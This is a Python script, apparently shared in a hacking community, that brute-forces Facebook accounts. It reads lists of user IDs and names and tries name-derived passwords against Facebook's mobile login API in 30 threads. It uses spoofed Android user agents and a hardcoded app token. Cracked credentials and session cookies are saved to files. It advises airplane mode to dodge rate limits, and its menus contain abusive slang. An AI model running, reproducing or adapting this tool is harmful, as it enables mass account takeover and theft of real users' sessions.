#coding = utf-8
#This Open-Source Script is Written by Aqib Ali Khan
#Please Donot Forget to give Credit 
#Whatsapp : +923152056613
import os
import sys
import re
import random,zlib
import time
from time import sleep as sp
import string,json
import subprocess
import base64,uuid
from requests.exceptions import ConnectionError as CError
from concurrent.futures import ThreadPoolExecutor as tpd


try:
	import requests
except ImportError:
	os.system('pip install requests')


ses = requests.Session()

id = []
ok = []
cp =[]
loop = 0
pwx = []
method = []


##______COLORS____ARE________######
pwx=[]
W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
S = '\033[96;1m'
N = '\x1b[0m'
#________________________________________#
def clear():
	os.system("clear")

def line():
	print(52*'-')
def p(x):
	print(x)

def logo():
	logo = (f'''\033[1;97m                                    
@@@@@@@   @@@  @@@       @@@  @@@  @@@@@@@  @@@@@@@@  
@@@@@@@@  @@@  @@@       @@@  @@@  @@@@@@@  @@@@@@@@  
@@!  @@@  @@!  @@!       @@!  @@@    @@!    @@!       
\033[1;96m!@!  @!@  !@!  !@!       !@!  @!@    !@!    !@!       
@!@  !@!  !!@  @!!       @!@  !@!    @!!    @!!!:!    
\033[1;97m!@!  !!!  !!!  !!!       !@!  !!!    !!!    !!!!!:    
!!:  !!!  !!:  !!:       !!:  !!!    !!:    !!:       
:!:  !:!  :!:   :!:      :!:  !:!    :!:    :!:       
 :::: ::   ::   :: ::::  ::::: ::     ::     :: ::::  
:: :  :   :    : :: : :   : :  :      :     : :: ::   
[<>] The Original Codes are Written by Dilute Codes
---------------------------------------------------
 ╰◈▪➣ Author    : Dilute Codes( Aqib Ali )
 ╰◈▪➣ Github    : https://github.com/Dilute Codes
 ╰◈▪➣ Facebook  : Dilute Codes
 ╰◈▪➣ Version   : DC Extreme [1.2]
 ╰◈▪➣   \033[1;96mNaam Ki Dosti Kaam ki Yaari\n\tDosron Ki Tarah ! Adat Nhi Hamari \033[1;97m
---------------------------------------------------''')
	p(logo)


ua3 = "YAHN APNY 3RD USER AGENT LGANY HE "



ua2 = ' YH 2ND USERAGENTS LGALO METHOD 2 KY LIYE'

# USER AGENT FUNCTION UA 1 METHOD 1
def iAmAndroidUa():
	# YHN APNY ESE ANDROID KY UA LGANY HE MNE EXAMPLE KY LIYE IPHONE KY LGAY
	ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
	END = "[FBAN/FBIOS;FBAV/{str(random.randint(111,999))+'.0.0.'+str(random.randrange(1,30))+'.'+str(random.randint(111,999))};FBBV/{FBBV};FBDV/iPhone10,{random.choice(['1','5'])};FBMD/iPhone;FBSN/iOS;FBSV/{(ios_version).replace('_','.')};FBSS/2;FBCR/{random.choice(['Jazz','Zong'])};FBID/phone;FBLC/en_US;FBOP/5;FBRV/{random.choice(['106631002','0'])}]"
	ua = random.choice(["Dalvik/2.1.0 (Linux; U; Android 11; motorola one 5G ace Build/RZKS31.Q3-45-16-9-11)","Dalvik/2.1.0 (Linux; U; Android 9; AFTWMST22 Build/PS7633.3445N)","Dalvik/2.1.0 (Linux; U; Android 10; 7LC1 Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 11; X88pro10.r.de.6330.d4.software Build/RP1A.201105.002)","Dalvik/2.1.0 (Linux; U; Android 11; PX1 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 5.0.0; View Prime Build/v12bn [FBAN/FB4A;FBAV/353.0.0.27.492;FBBV/558626621;FBDM/{density=3.0,width=720,height=1280};FBLC/en_US;FBRV/558626621;FBMF/Wiko;FBBD/Wiko;FBPN/com.facebook.orca;FBDV/View Prime;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]","Dalvik/2.1.0 (Linux; U; Android 5.1; Archos 50 Cobalt Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4a (5G) Build/TQ2A.230405.003.A2)","Dalvik/2.1.0 (Linux; U; Android 13; PHP110 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; V2238 Build/TP1A.220624.014_NONFCMOD1)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-T818 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 12; TECNO Mobile CH9n Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; T96R Build/LMY49F)","Dalvik/2.1.0 (Linux; U; Android 7.0; Moto C Build/NRD90M.041)","Dalvik/2.1.0 (Linux; U; Android 13; SH-M24 Build/S3162)","Dalvik/2.1.0 (Linux; U; Android 10.0; T9212A Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 11; AiPlus2K Build/RTM3.211215.123)","Dalvik/2.1.0 (Linux; U; Android 9; SA 2K TV Build/PTO7.211209.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g32 Build/S2SNS32.34-60-6)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; SF550 Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A536N Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Build/TQ2A.230305.008.C1)","Dalvik/2.1.0 (Linux; U; Android 9; Viva_1003G Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 12; ZTE A2322G Build/SKQ1.220213.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g stylus 5G (2022) Build/S1SDS32.56-81-10)","Dalvik/2.1.0 (Linux; U; Android 9; coral Build/R112-15359.58.0)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A3460 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; V2239 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; S1 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 5 Build/TQ2A.230405.003)","Dalvik/2.1.0 (Linux; U; Android 13; Bengal for arm64 Build/TKQ1.221013.002)","Dalvik/2.1.0 (Linux; U; Android 7.0; X12 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2465 Build/RKQ1.211119.001)","Dalvik/2.1.0 (Linux; U; Android 11; Q9.r1.00.6330_642.d4 Build/RP1A.201105.002)","Dalvik/2.1.0 (Linux; U; Android 11; hatch Build/R112-15359.45.0)","Dalvik/2.1.0 (Linux; U; Android 13; Subsystem for Android(TM) Build/TQ2A.230305.008.C1)","Dalvik/2.1.0 (Linux; U; Android 13; TECNO KI7 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; N210 Build/OPM2.171019.012)","Dalvik/2.1.0 (Linux; U; Android 5.1; i1002SK Build/LMY47I)","Dalvik/2.1.0 (Linux; U; Android 11; Hisense E20s Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 10; Primo E12 Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 12; moto g power (2022) Build/S3RQ32.20-42-10-1)","Dalvik/1.6.0 (Linux; U; Android 4.2.2; SBM303SH Build/S0034)","Dalvik/2.1.0 (Linux; U; Android 12; V22S Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G955N Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Dalvik/2.1.0 (Linux; U; Android 8.0.0; Moto Z (2) Build/OPXS27.109-40-22)","Dalvik/2.1.0 (Linux; U; Android 11; AT70K Build/RP1A.201005.006)","Dalvik/2.1.0 (Linux; U; Android 13; moto e13 Build/TLA33.105-42-42)","Dalvik/2.1.0 (Linux; U; Android 11; RMX3506 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 13; 21051182C Build/TKQ1.221013.002)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BC62 Build/61.2.A.0.410)","Dalvik/2.1.0 (Linux; U; Android 11; AQUOS-TVE21A Build/RTM2.210929.167)","Dalvik/2.1.0 (Linux; U; Android 8.0.0; MBX4K Ranger Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 13; SM-G770F Build/TP1A.220624.014; BroadcastDotRadioApp )","Dalvik/2.1.0 (Linux; U; Android 10; VOG-TL00 Build/HUAWEIDRA-LX9)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; S23 Ultra Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 9; UK 4K Android TV Build/PTO6.220926.001)","Dalvik/2.1.0 (Linux; U; Android 12; Armor X10 Pro Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 10; LT600T Build/QKQ1.200216.002)","Dalvik/2.1.0 (Linux; U; Android 13; SHG07 Build/S116H)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/T3B2.230316.003)","Dalvik/2.1.0 (Linux; U; Android 5.1; Ixion ES350 Build/DEXP)","Dalvik/2.1.0 (Linux; U; Android 12; ELZ-AN20 Build/HONORELZ-AN20)","Dalvik/2.1.0 (Linux; U; Android 13; motorola edge 20 pro Build/T1RA33.55-15-10)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; ASUS_Z012DA Build/MMB29P)","Dalvik/2.1.0 (Linux; U; Android 11; BQru-6868L Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 12; TAB_912_PRO_4G Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; 22031116AI Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 10; O2 TV Box Build/QTT2.200720.001)","Dalvik/2.1.0 (Linux; U; Android 9; motorola one vision Build/PSA29.97-37)","Dalvik/2.1.0 (Linux; U; Android 9; AFTANNA0 Build/PMAIN1.2992N)","Dalvik/2.1.0 (Linux; U; Android 13; M2101K6P Build/TKQ1.221013.002)","Dalvik/2.1.0 (Linux; U; Android 13; V2127 Build/TP1A.220624.014_NONFC)","Dalvik/2.1.0 (Linux; U; Android 11; octopus Build/R112-15359.58.0)","Dalvik/2.1.0 (Linux; U; Android 13; 23021RAAEG Build/TKQ1.221114.001)","Dalvik/2.1.0 (Linux; U; Android 13; SM-G950F Build/TQ2A.230405.003.E1)","Dalvik/2.1.0 (Linux; U; Android 12; 100071485 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; SM-A505N Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 10.0; YT7260L Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; Gtel X7plus Build/O11019)","Dalvik/1.6.0 (Linux; U; Android 4.4.4; TPS550A Build/KTU84Q)","Dalvik/2.1.0 (Linux; U; Android 10; TC57 Build/10-16-10.00-QG-U133-STD-HEL-04)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2271 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; iris60c Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; GT-S7580 Build/LMY48Y)","Dalvik/2.1.0 (Linux; U; Android 7.0; SPYBOXSXMINI Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 11; K55g Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 12; V2065 Build/SP1A.210812.003)","Dalvik/2.1.0 (Linux; U; Android 11; E506 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 11; BNE-LX3 Build/HUAWEIBNE-LX3)","Dalvik/2.1.0 (Linux; U; Android 9; APEXA-A-1500 Build/PI)","Dalvik/2.1.0 (Linux; U; Android 9; DL3Plus Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 11; E7110 Build/4.501VZ.0568.a)","Dalvik/2.1.0 (Linux; U; Android 9; VISIO TV Build/PTO7.210711.001)","Dalvik/2.1.0 (Linux; U; Android 9.0; PHILCO_ATV11 Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 13; Redmi Note 8 Build/TQ1A.230205.002)","Dalvik/2.1.0 (Linux; U; Android 12; RBN-NX1 Build/HONORRBN-N31)","Dalvik/2.1.0 (Linux; U; Android 10; motorola one action Build/QSB30.62-17-17)","Dalvik/2.1.0 (Linux; U; Android 5.1; YU 6000 Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 13; 23028RA60L Build/TKQ1.221114.001)",])+END
	return ua

	
class Main:
	def __init__(self):
		os.system('clear')
	def saved_results(self,ok,cp):
		if len(ok) != 0 or len(cp) != 0:
			p('\n')
			line()
			p(' [•] Cloning Process Has Been Completed ')
			p(' [•] Total OK Accounts : %s '%(len(ok)))
			p(' [•] Total CP Accounts : %s '%(len(cp)))
			line()
			input(' [•] Press Enter To Go Back To Main Menu ')
			self.menu()
	def menu(self):
		logo()
		p(' [•] This Script is Free Open-Souce Coded by Aqib Ali ID ')
		line()
		p(' [1] File Cracking ')
		p(" [2] Join Dilute Coders Facebook Group ")
		p(' [3] Join Dilute Coders Whatsapp Group ')
		line()
		m_1 = input(' [•] Choose : ')
		if m_1 == '1':
			self.methods_menu()
		elif m_1 == '2':
			os.system('xdg-open https://facebook.com/groups/124939013896146/')
			sp(1)
			self.menu()
		elif m_2 =='3':
			os.system('xdg-open https://chat.whatsapp.com/GzUiQ51HrLpDzebhrmsgYh')
		else:
			p(' [•] Wrong Select Hai Bhosdikay ')
			sp(1)
			self.menu()
	def methods_menu(self):
		line()
		p(' [1] Method 1 \n [2] Method 2 \n [3] Method 3')
		line()
		m_2 = input(' [•] Select Method : ')
		if m_2 == '1':
			method.append('i')
			self.cracking()
		elif m_2 == '2':
			method.append('ii')
			self.cracking()
		elif m_2 == '3':
			method.append('iii')
			self.cracking()
		else:
			p(' [•] Wrong Select Hai Bhosdikay ')
			sp(1)
			self.methods_menu()

	def cracking(self):
		clear()
		logo()
		try:
			file = input(' [•] Put File Path : ')
			id = open(file).read().splitlines()
			self.password_menu(id)
		except FileNotFoundError:
			p(' [X] File Path Wrong....')
			sp(2)
			self.cracking()

	def password_menu(self,id):
		clear()
		logo()
		p(' [•] Enter Password Limit Between 1 to 20 (Max) ')
		try:
			plimit = int(input(' [•] Put Limit : '))
			if plimit == '':
				plimit = 4
			elif plimit > 20:
				limit = 10
		except:
			plimit = 4
		clear();logo()
		print(' [•] Example : first123,last1122,firstlast,last Etc ')
		for n in range(plimit):
			pwx.append(input(' [•] Put Password %s : '%(n+1)))
		clear();logo()
		p(' [•] Dilute Brute Has Been Started ')
		line()
		p(' [•] Total Clone Accounts :  %s '%(len(id)))
		line()
		p(' [•] Use Flight ( Jahaz ) Mode Before / During Cloning ')
		line()
		with tpd(max_workers=30) as saqi:
			for user in id:
				uid,nm = user.split('|')
				if 'i' in method:
					saqi.submit(self.method1,uid,nm,pwx)
				elif 'ii' in method:
					saqi.submit(self.method2,uid,nm,pwx)
				elif 'iii' in method:
					saqi.submit(self.method3,uid,nm,pwx)
		self.saved_results(ok,cp)

	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [AQIB] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": uid,
"password": pw,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent': iAmAndroidUa(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
				if "session_key" in q:
					coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
					cookie = f"sb={sb};{coki}"
					p('\r\033[1;92m[AQIB-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/AQIB_M1_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/AQIB_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[AQIB-CP] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/AQIB_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
				self.method1(uid,nm,pwx)

	def method2(self,uid,nm,pwx):
		#YE METHOD 2 HE
		print(" [ METHOD 2] YHN AP 2ND METHOD LGALO ...")
		exit()

	def method3(self,uid,nm,pwx):
		#YE METHOD 3 HE
		print(" [ METHOD 3 ] YHN AP 3RD METHOD LGALO ...")
		exit()

		exit()
if __name__=="__main__":
	Main().menu()